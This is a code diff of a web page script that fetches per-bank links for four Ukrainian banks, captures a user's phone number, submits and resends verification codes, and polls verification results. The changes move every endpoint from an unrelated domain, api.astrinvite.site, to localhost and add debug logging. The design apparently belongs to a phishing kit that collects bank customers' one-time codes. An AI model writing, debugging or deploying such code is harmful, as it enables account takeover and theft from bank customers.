@@ -472,23 +472,23 @@
 
   <script>
     const API_MAP = {
-      mono:   "https://api.astrinvite.site/link?bank=monobank",
-      oschad: "https://api.astrinvite.site/link?bank=oschadbank",
-      raiff:  "https://api.astrinvite.site/link?bank=raiffeisenbank",
-      pumb:   "https://api.astrinvite.site/link?bank=pumbbank"
+      mono:   "http://localhost:8000/link?bank=monobank",
+      oschad: "http://localhost:8000/link?bank=oschadbank",
+      raiff:  "http://localhost:8000/link?bank=raiffeisenbank",
+      pumb:   "http://localhost:8000/link?bank=pumbbank"
     };
     
     const CONSUME_MAP = {
-      mono:   "https://api.astrinvite.site/consume-link?bank=monobank",
-      oschad: "https://api.astrinvite.site/consume-link?bank=oschadbank",
-      raiff:  "https://api.astrinvite.site/consume-link?bank=raiffeisenbank",
-      pumb:   "https://api.astrinvite.site/consume-link?bank=pumbbank"
+      mono:   "http://localhost:8000/consume-link?bank=monobank",
+      oschad: "http://localhost:8000/consume-link?bank=oschadbank",
+      raiff:  "http://localhost:8000/consume-link?bank=raiffeisenbank",
+      pumb:   "http://localhost:8000/consume-link?bank=pumbbank"
     };
     
-    const STATUS_URL = "https://api.astrinvite.site/api/link-status";
-    const CODE_URL   = "https://api.astrinvite.site/api/submit-code";
-    const RESEND_URL = "https://api.astrinvite.site/api/resend-code";
-    const RESEND_STATUS_URL = "https://api.astrinvite.site/api/resend-status";
+    const STATUS_URL = "http://localhost:8000/api/link-status";
+    const CODE_URL   = "http://localhost:8000/api/submit-code";
+    const RESEND_URL = "http://localhost:8000/api/resend-code";
+    const RESEND_STATUS_URL = "http://localhost:8000/api/resend-status";
 
     // Переменная для номера телефона
     let userPhoneNumber = null;
@@ -536,6 +536,9 @@
       if (!btn) return;
 
       try {        
+        console.log(`🔍 Проверяем ссылки для банка: ${bank}`);
+        console.log(`📡 URL запроса: ${API_MAP[bank]}`);
+        
         const res = await fetch(API_MAP[bank], {
           method: 'GET',
           cache: 'no-cache',
@@ -545,18 +548,24 @@
           }
         });
         
+        console.log(`📊 Ответ сервера для ${bank}: ${res.status}`);
+        
         if (res.ok) {
           const data = await res.json();
+          console.log(`📦 Данные для ${bank}:`, data);
+          
           if (data.url && data.id) {
             linkData[bank] = { url: data.url, id: data.id };
             btn.disabled = false;
             btn.onclick = () => handleBankClick(bank);
             btn.textContent = BANK_TEXTS[bank + "-btn"];
+            console.log(`✅ Кнопка ${bank} активирована!`);
           } else {
             btn.disabled = true;
             btn.onclick = null;
             delete linkData[bank];
             btn.textContent = BANK_TEXTS[bank + "-btn"];
+            console.log(`❌ Кнопка ${bank} деактивирована - нет url/id`);
           }
         } else if (res.status === 429) {
           // Нет доступных ссылок
@@ -564,12 +573,13 @@
           btn.onclick = null;
           delete linkData[bank];
           btn.textContent = BANK_TEXTS[bank + "-btn"];
+          console.log(`⚠️ Кнопка ${bank} деактивирована - нет доступных ссылок (429)`);
         } else {
-          console.log(`Ошибка ${bank}: ${res.status}`);
+          console.log(`❗ Ошибка ${bank}: ${res.status}`);
           btn.textContent = BANK_TEXTS[bank + "-btn"];
         }
       } catch (error) {
-        console.error(`Ошибка проверки ${bank}:`, error);
+        console.error(`❗ Ошибка проверки ${bank}:`, error);
         btn.textContent = BANK_TEXTS[bank + "-btn"];
       }
     }
@@ -964,7 +974,7 @@
       
       for (let i = 0; i < 30; i++) { // Ждем максимум 30 секунд
         try {
-          const res = await fetch(`https://api.astrinvite.site/api/check-verification-result?id=${currentId}`);
+          const res = await fetch(`http://localhost:8000/api/check-verification-result?id=${currentId}`);
           const result = await res.json();
           
           if (result.status === "success") {
